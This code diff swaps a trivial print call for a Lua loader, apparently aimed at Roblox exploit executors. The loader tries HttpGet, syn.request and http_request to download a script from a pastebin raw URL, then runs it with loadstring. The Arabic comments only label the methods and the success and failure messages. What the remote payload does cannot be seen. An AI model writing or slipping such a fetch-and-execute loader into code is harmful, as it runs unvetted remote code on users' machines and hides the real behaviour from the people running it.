@@ -1,1 +1,31 @@
-print("said")
+local url = "https://pastebin.com/raw/XBg5RrKk"
+local content = nil
+
+-- الطريقة 1: HttpGet
+local ok1, res1 = pcall(function()
+    return game:HttpGet(url)
+end)
+if ok1 then content = res1 end
+
+-- الطريقة 2: request (إذا كان موجوداً)
+if not content and syn and syn.request then
+    local ok2, res2 = pcall(function()
+        return syn.request({Url = url, Method = "GET"})
+    end)
+    if ok2 and res2.Body then content = res2.Body end
+end
+
+-- الطريقة 3: http_request
+if not content and http_request then
+    local ok3, res3 = pcall(function()
+        return http_request({Url = url, Method = "GET"})
+    end)
+    if ok3 and res3.Body then content = res3.Body end
+end
+
+if content and content ~= "" then
+    loadstring(content)()
+    print("✅ تم التشغيل!")
+else
+    print("❌ الرابط لا يمكن الوصول إليه")
+end
